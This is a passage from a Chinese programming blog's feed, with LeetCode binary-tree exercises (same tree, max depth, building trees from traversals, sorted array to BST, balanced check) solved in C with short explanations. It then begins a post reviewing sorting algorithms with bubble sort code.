<span class="hljs-number">1</span>)&#123;<br>        flag = <span class="hljs-number">2</span>;<br>        mysecond = root;<br>    &#125;<br>    last = root;<br>    midOrder(root-&gt;right);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="3-相同的树"><a href="#3-相同的树" class="headerlink" title="3.相同的树"></a>3.相同的树</h2><h3 id="3-1题目描述"><a href="#3-1题目描述" class="headerlink" title="3.1题目描述"></a>3.1题目描述</h3><p>给定两个二叉树，编写一个函数来检验它们是否相同。</p><p>如果两个树在结构上相同，并且节点具有相同的值，则认为它们是相同的。</p><p>示例 1:</p><p>输入:       </p><p> 1         1<br> &#x2F; \       &#x2F; <br>2   3     2   3</p><p>[1,2,3],   [1,2,3]</p><p>输出: true</p><p>示例 2:</p><p>输入:    </p><p> 1          1<br> &#x2F;           \</p><p>2             2</p><p>[1,2],     [1,null,2]</p><p>输出: false</p><p>示例 3:</p><p>输入:  1         1<br>          &#x2F; \       &#x2F; <br>         2   1     1   2</p><p>[1,2,1],   [1,1,2]</p><p>输出: false</p><p>来源：<a href="https://leetcode-cn.com/problems/same-tree">https://leetcode-cn.com/problems/same-tree</a></p><h3 id="3-2思路分析"><a href="#3-2思路分析" class="headerlink" title="3.2思路分析"></a>3.2思路分析</h3><p>使用递归算法遍历即可，比较相应的访问到的节点值是否相等，边界问题有点恶心，一定要注意到判断语句的边界问题，本身很简单，但是稍微不注意就错了。</p><h3 id="3-3代码"><a href="#3-3代码" class="headerlink" title="3.3代码"></a>3.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">isSameTree</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* p, <span class="hljs-keyword">struct</span> TreeNode* q)</span>&#123;<br>    <span class="hljs-keyword">if</span>(p == <span class="hljs-literal">NULL</span> &amp;&amp; q == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(p == <span class="hljs-literal">NULL</span> || q==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(p-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; q-&gt;left == <span class="hljs-literal">NULL</span>&amp;&amp;p-&gt;val == q-&gt;val &amp;&amp; p-&gt;right == <span class="hljs-literal">NULL</span> &amp;&amp; q-&gt;right == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(p-&gt;val == q-&gt;val )&#123;<br>        <span class="hljs-keyword">return</span> isSameTree(p-&gt;left,q-&gt;left)&amp;&amp;isSameTree(p-&gt;right,q-&gt;right);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-二叉树最大深度"><a href="#4-二叉树最大深度" class="headerlink" title="4.二叉树最大深度"></a>4.二叉树最大深度</h2><h3 id="4-1题目描述"><a href="#4-1题目描述" class="headerlink" title="4.1题目描述"></a>4.1题目描述</h3><p>给定一个二叉树，找出其最大深度。</p><p>二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</p><p>说明: 叶子节点是指没有子节点的节点。</p><p>示例：<br>给定二叉树 [3,9,20,null,null,15,7]，</p><p>  3</p><p> &#x2F; \</p><p>9  20<br>    &#x2F;  <br>  15   7</p><p>返回它的最大深度 3 。</p><p>来源：<a href="https://leetcode-cn.com/problems/maximum-depth-of-binary-tree">https://leetcode-cn.com/problems/maximum-depth-of-binary-tree</a></p><h3 id="4-2思路分析"><a href="#4-2思路分析" class="headerlink" title="4.2思路分析"></a>4.2思路分析</h3><p>很简单，递归遍历即可，设置左右两个值，取最大的返回并加一。</p><h3 id="4-3代码"><a href="#4-3代码" class="headerlink" title="4.3代码"></a>4.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;<br>    <span class="hljs-keyword">if</span>(a&gt;b)&#123;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-keyword">return</span> b;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">maxDepth</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> left_height = maxDepth(root-&gt;left);<br>        <span class="hljs-type">int</span> right_height = maxDepth(root-&gt;right);<br>        <span class="hljs-keyword">return</span> max(left_height, right_height) + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-从前序与中序遍历序列构造二叉树"><a href="#5-从前序与中序遍历序列构造二叉树" class="headerlink" title="5.从前序与中序遍历序列构造二叉树"></a>5.从前序与中序遍历序列构造二叉树</h2><h3 id="5-1题目描述"><a href="#5-1题目描述" class="headerlink" title="5.1题目描述"></a>5.1题目描述</h3><p>根据一棵树的前序遍历与中序遍历构造二叉树。</p><p>注意:<br>你可以假设树中没有重复的元素。</p><p>例如，给出</p><p>前序遍历 preorder &#x3D; [3,9,20,15,7]<br>中序遍历 inorder &#x3D; [9,3,15,20,7]</p><p>返回如下的二叉树：</p><p>​    3</p><p>   &#x2F; <br>  9  20<br>    &#x2F;  <br>   15   7</p><p>来源：<a href="https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal">https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal</a></p><h3 id="5-2思路分析"><a href="#5-2思路分析" class="headerlink" title="5.2思路分析"></a>5.2思路分析</h3><p>先序遍历的顺序是 Root -&gt; Left -&gt; Right，这就能方便的从根开始构造一棵树。<br>首先，preorder 中的第一个元素一定是树的根，这个根又将 inorder 序列分成了左右两棵子树。现在我们只需要将先序遍历的数组中删除根元素，然后重复上面的过程处理左右两棵子树。</p><h3 id="5-3代码"><a href="#5-3代码" class="headerlink" title="5.3代码"></a>5.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><br><span class="hljs-keyword">struct</span> TreeNode* <span class="hljs-title function_">buildTree</span><span class="hljs-params">(<span class="hljs-type">int</span>* preorder, <span class="hljs-type">int</span> preorderSize, <span class="hljs-type">int</span>* inorder, <span class="hljs-type">int</span> inorderSize)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">newNode</span>;</span><br>    <span class="hljs-type">int</span> p = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (preorder == <span class="hljs-literal">NULL</span> || inorder == <span class="hljs-literal">NULL</span> || preorderSize &lt;= <span class="hljs-number">0</span> || inorderSize &lt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    newNode = (<span class="hljs-keyword">struct</span> TreeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> TreeNode));<br>    newNode-&gt;val = preorder[p];<br>    newNode-&gt;left = <span class="hljs-literal">NULL</span>;<br>    newNode-&gt;right = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; inorderSize; i++) &#123;<br>        <span class="hljs-keyword">if</span> (inorder[i] == newNode-&gt;val) &#123;<br>            newNode-&gt;left = buildTree(&amp;preorder[p + <span class="hljs-number">1</span>], i, inorder, i);<br>            newNode-&gt;right = buildTree(&amp;preorder[p + i + <span class="hljs-number">1</span>], preorderSize - i - <span class="hljs-number">1</span>, &amp;inorder[i + <span class="hljs-number">1</span>], inorderSize - i - <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> newNode;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-从中序与后序遍历序列构造二叉树"><a href="#6-从中序与后序遍历序列构造二叉树" class="headerlink" title="6.从中序与后序遍历序列构造二叉树"></a>6.从中序与后序遍历序列构造二叉树</h2><h3 id="6-1题目描述"><a href="#6-1题目描述" class="headerlink" title="6.1题目描述"></a>6.1题目描述</h3><p>根据一棵树的中序遍历与后序遍历构造二叉树。</p><p>注意:<br>你可以假设树中没有重复的元素。</p><p>例如，给出</p><p>中序遍历 inorder &#x3D; [9,3,15,20,7]<br>后序遍历 postorder &#x3D; [9,15,7,20,3]</p><p>返回如下的二叉树：</p><p>​     3</p><p>​    &#x2F; <br>  9  20<br>​       &#x2F;  <br>​     15   7</p><p>来源：<a href="https://leetcode-cn.com/problems/construct-binary-tree-from-inorder-and-postorder-traversal">https://leetcode-cn.com/problems/construct-binary-tree-from-inorder-and-postorder-traversal</a></p><h3 id="6-2思路"><a href="#6-2思路" class="headerlink" title="6.2思路"></a>6.2思路</h3><p>和上面的基本差不多，后序遍历的顺序是  Left -&gt; Right -&gt;Root，这就能方便的从根开始构造一棵树。<br>首先，postorder中的最后一个元素一定是树的根，这个根又将 inorder 序列分成了左右两棵子树。现在我们只需要将后序遍历的数组中删除根元素，然后重复上面的过程处理左右两棵子树。</p><h3 id="6-3代码"><a href="#6-3代码" class="headerlink" title="6.3代码"></a>6.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><br><span class="hljs-keyword">struct</span> TreeNode* <span class="hljs-title function_">buildTree</span><span class="hljs-params">(<span class="hljs-type">int</span>* inorder, <span class="hljs-type">int</span> inorderSize, <span class="hljs-type">int</span>* postorder, <span class="hljs-type">int</span> postorderSize)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">newNode</span>;</span><br>    <span class="hljs-type">int</span> p = postorderSize - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (postorder == <span class="hljs-literal">NULL</span> || inorder == <span class="hljs-literal">NULL</span> || postorderSize &lt;= <span class="hljs-number">0</span> || inorderSize &lt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    newNode = (<span class="hljs-keyword">struct</span> TreeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> TreeNode));<br>    newNode-&gt;val = postorder[p];<br>    newNode-&gt;left = <span class="hljs-literal">NULL</span>;<br>    newNode-&gt;right = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; inorderSize ; i++) &#123;<br>        <span class="hljs-keyword">if</span> (inorder[i] == newNode-&gt;val) &#123;<br>            newNode-&gt;right = buildTree(&amp;inorder[i + <span class="hljs-number">1</span>], inorderSize - i - <span class="hljs-number">1</span>,&amp;postorder[i], postorderSize - i - <span class="hljs-number">1</span>);<br>            newNode-&gt;left = buildTree(inorder, i,postorder, i);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> newNode;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-将有序数组转换为二叉搜索树"><a href="#7-将有序数组转换为二叉搜索树" class="headerlink" title="7.将有序数组转换为二叉搜索树"></a>7.将有序数组转换为二叉搜索树</h2><h3 id="7-1题目描述"><a href="#7-1题目描述" class="headerlink" title="7.1题目描述"></a>7.1题目描述</h3><p>将一个按照升序排列的有序数组，转换为一棵高度平衡二叉搜索树。</p><p>本题中，一个高度平衡二叉树是指一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过 1。</p><p>示例:</p><p>给定有序数组: [-10,-3,0,5,9],</p><p>一个可能的答案是：[0,-3,9,-10,null,5]，它可以表示下面这个高度平衡二叉搜索树：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">     <span class="hljs-number">0</span><br>    / \<br>  -<span class="hljs-number">3</span>   <span class="hljs-number">9</span><br>  <span class="hljs-regexp">/   /</span><br>-<span class="hljs-number">10</span>  <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>来源：<a href="https://leetcode-cn.com/problems/convert-sorted-array-to-binary-search-tree">https://leetcode-cn.com/problems/convert-sorted-array-to-binary-search-tree</a></p><h3 id="7-2思路分析"><a href="#7-2思路分析" class="headerlink" title="7.2思路分析"></a>7.2思路分析</h3><p>二叉搜索树就是节点的左子树只包含小于当前节点的数。节点的右子树只包含大于当前节点的数。所有左子树和右子树自身必须也是二叉搜索树。</p><p>我们首先要找到根节点，根节点就是数组最中间的值，如果是奇数就取最中间，偶数我们这里选择取中间靠左的位置，直接（left+right）&#x2F;2即可，然后左边调用left<del>mid，右边mid+1</del>right，递归调用即可。</p><h3 id="7-3代码"><a href="#7-3代码" class="headerlink" title="7.3代码"></a>7.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">struct</span> TreeNode* <span class="hljs-title function_">helper</span><span class="hljs-params">(<span class="hljs-type">int</span> left,<span class="hljs-type">int</span> right,<span class="hljs-type">int</span> *nums)</span>&#123;<br>    <span class="hljs-keyword">if</span>(left &gt;= right)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> midpos = <span class="hljs-number">0</span>;<br>    midpos = (left+right)/<span class="hljs-number">2</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> *<span class="hljs-title">node</span> =</span> <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> TreeNode));<br>    node-&gt;val = nums[midpos];<br>    node-&gt;left = helper(left,midpos,nums);<br>    node-&gt;right = helper(midpos+<span class="hljs-number">1</span>,right,nums);<br><br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br><span class="hljs-keyword">struct</span> TreeNode* <span class="hljs-title function_">sortedArrayToBST</span><span class="hljs-params">(<span class="hljs-type">int</span>* nums, <span class="hljs-type">int</span> numsSize)</span>&#123;<br>    <span class="hljs-keyword">return</span> helper(<span class="hljs-number">0</span>,numsSize,nums);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-平衡二叉树"><a href="#8-平衡二叉树" class="headerlink" title="8.平衡二叉树"></a>8.平衡二叉树</h2><h3 id="8-1题目描述"><a href="#8-1题目描述" class="headerlink" title="8.1题目描述"></a>8.1题目描述</h3><p>给定一个二叉树，判断它是否是高度平衡的二叉树。<br>本题中，一棵高度平衡二叉树定义为：<br>一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过1。<br>示例 1:<br>给定二叉树 [3,9,20,null,null,15,7]</p><p>返回 true 。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">  <span class="hljs-number">3</span><br> / <span class="hljs-string">\</span><br><span class="hljs-number">9</span>  <span class="hljs-number">20</span><br>  /  <span class="hljs-string">\</span><br> <span class="hljs-number">15</span>   <span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>返回 true 。</p><p>示例 2:<br>给定二叉树 [1,2,2,3,3,null,null,4,4]</p><p>返回 false 。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">      <span class="hljs-number">1</span><br>     / <span class="hljs-string">\</span><br>    <span class="hljs-number">2</span>   <span class="hljs-number">2</span><br>   / <span class="hljs-string">\</span><br>  <span class="hljs-number">3</span>   <span class="hljs-number">3</span><br> / <span class="hljs-string">\</span><br><span class="hljs-number">4</span>   <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>返回 false 。</p><p>来源：<a href="https://leetcode-cn.com/problems/balanced-binary-tree/">https://leetcode-cn.com/problems/balanced-binary-tree/</a></p><h3 id="8-2思路"><a href="#8-2思路" class="headerlink" title="8.2思路"></a>8.2思路</h3><p>这个最简单的方法就是不停计算子树的最大深度，如果相差大于1，就不是平衡二叉树。结合前面的查找二叉树的最大深度来写这个代码。</p><h3 id="8-3代码"><a href="#8-3代码" class="headerlink" title="8.3代码"></a>8.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;<br>    <span class="hljs-keyword">if</span>(a&gt;b)&#123;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-keyword">return</span> b;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">maxDepth</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> left_height = maxDepth(root-&gt;left);<br>        <span class="hljs-type">int</span> right_height = maxDepth(root-&gt;right);<br>        <span class="hljs-keyword">return</span> max(left_height, right_height) + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">isBalanced</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span>&#123;<br>    <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">abs</span>(maxDepth(root-&gt;right)-maxDepth(root-&gt;left)) &gt; <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> isBalanced(root-&gt;left)&amp;&amp;isBalanced(root-&gt;right);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>DFS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法练习-2</title>
    <link href="/blog/2020/03/03/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-2/"/>
    <url>/blog/2020/03/03/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-2/</url>
    
    <content type="html"><![CDATA[<p><strong>今天主要复习一下各种排序算法，以后机试可能会有用。</strong></p><p><img src="/images/fj36.jpg"></p><span id="more"></span><h2 id="1-冒泡排序"><a href="#1-冒泡排序" class="headerlink" title="1.冒泡排序"></a>1.冒泡排序</h2><p>冒泡排序是一种简单的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果它们的顺序错误就把它们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。</p><h3 id="1-1算法描述"><a href="#1-1算法描述" class="headerlink" title="1.1算法描述"></a>1.1算法描述</h3><p>步骤1: 比较相邻的元素。如果第一个比第二个大，就交换它们两个；<br>步骤2: 对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对，这样在最后的元素应该会是最大的数；<br>步骤3: 针对所有的元素重复以上的步骤，除了最后一个；<br>步骤4: 重复步骤1~3，直到排序完成。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMjMyMzg0NDktMjE0NjE2OTE5Ny5naWY"></p><h3 id="1-2代码"><a href="#1-2代码" class="headerlink" title="1.2代码"></a>1.2代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>* <span class="hljs-title function_">bubbleSort</span><span class="hljs-params">(<span class="hljs-type">int</span>* numArray,<span class="hljs-type">int</span> numLen)</span>&#123;<br>    <span class="hljs-type">int</span> i,j,temp;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i&lt;numLen;i++)&#123;<br>    <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>;j&lt;numLen-i<span class="hljs-number">-1</span>;j++)&#123;<br>    <span class="hljs-keyword">if</span>(numArray[j]&gt;numArray[j+<span class="hljs-number">1</span>])&#123;<br>    temp = numArray[j+<span class="hljs-number">1</span>];<br>    numArray[j+<span class="hljs-number">1</span>]=numArray[j];<br>    numArray[j]=temp;<br>    &#125;<br>    &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> numArray;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-选择排序"><a href="#2-选择排序" class="headerlink" title="2.选择排序"></a>2.选择排序</h2><p>选择排序 是表现最稳定的排序算法之一 ，因为无论什么数据进去都是O(n2)的时间复杂度 ，所以用到它的时候，数据规模越小越好。唯一的好处可能就是不占用额外的内存空间了吧。理论上讲，选择排序可能也是平时排序一般人想到的最多的排序方法。<br>    选择排序(Selection-sort) 是一种简单直观的排序算法。它的工作原理：首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。</p><h3 id="2-1算法描述"><a href="#2-1算法描述" class="headerlink" title="2.1算法描述"></a>2.1算法描述</h3><p> n个记录的直接选择排序可经过n-1趟直接选择排序得到有序结果。具体算法描述如下：<br>    步骤1：初始状态：无序区为R[1…n]，有序区为空；<br>    步骤2：第i趟排序(i&#x3D;1,2,3…n-1)开始时，当前有序区和无序区分别为R[1…i-1]和R(i…n）。该趟排序从当前无序区中-选出关键字最小的记录 R[k]，将它与无序区的第1个记录R交换，使R[1…i]和R[i+1…n)分别变为记录个数增加1个的新有序区和记录个数减少1个的新无序区；<br>    步骤3：n-1趟结束，数组有序化了</p><p><img 